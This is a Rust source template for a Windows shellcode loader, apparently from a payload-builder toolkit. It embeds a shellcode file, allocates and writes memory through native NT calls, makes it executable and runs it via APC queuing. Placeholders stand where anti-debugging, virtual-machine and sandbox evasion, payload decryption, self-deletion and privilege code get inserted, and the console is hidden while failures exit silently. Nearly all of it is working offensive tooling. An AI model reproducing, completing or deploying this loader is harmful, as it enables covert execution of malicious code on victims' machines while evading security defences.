#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(unused_imports)]

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE}
    },
    shared::{
        ntdef::{NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use ntapi::ntpsapi::PPS_APC_ROUTINE;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use std::{ptr::null_mut};
use ntapi::ntpsapi::NtCurrentProcess;
use ntapi::ntpsapi::NtCurrentThread;
use ntapi::ntmmapi::NtAllocateVirtualMemory;
use ntapi::ntmmapi::NtWriteVirtualMemory;
use ntapi::ntmmapi::NtProtectVirtualMemory;
use ntapi::ntpsapi::NtQueueApcThread;
use ntapi::ntpsapi::NtTestAlert;
use std::include_bytes;

{{ENCRYPTION_IMPORTS}}
{{ANTIDEBUG_IMPORTS}}
{{VM_IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DEOBFUSCATION_IMPORTS}}

{{ANTIDEBUG_FUNCTION}}
{{VM_FUNCTION}}
{{SANDBOX_FUNCTION}}
{{DECRYPTION_FUNCTION}}
{{DEOBFUSCATION_FUNCTION}}

fn enhance(mut buf: Vec<u8>) {
    unsafe {
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = NtAllocateVirtualMemory(NtCurrentProcess, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            // panic!("Error allocating memory to the local process: {}", alloc_status);
            std::process::exit(0);
        }

        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = NtWriteVirtualMemory(NtCurrentProcess, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            // panic!("Error writing to the local process: {}", write_status);
            std::process::exit(0);
        }

        let mut old_perms = PAGE_READWRITE;
        let protect_status = NtProtectVirtualMemory(NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
        if !NT_SUCCESS(protect_status) {
            //panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
            std::process::exit(0);
        }

        let apc = NtQueueApcThread(NtCurrentThread, Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE, allocstart, null_mut(), null_mut());
        if !NT_SUCCESS(apc) {
            //panic!("Error failed to call QueueUqerAPC: {}", apc);
            std::process::exit(0);
        }

        NtTestAlert();
    }
}

fn main() {

    {{SELF-DESTROY}}
    {{DEBUG_PRIVILEGE}}
    {{VM}}
    {{SANDBOX}}
    {{ANTIDEBUG}}

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }

    {{DEOBFUSCATION}}
    {{DECRYPTION}}

    enhance(vec.clone());
}

{{DLL_MAIN}}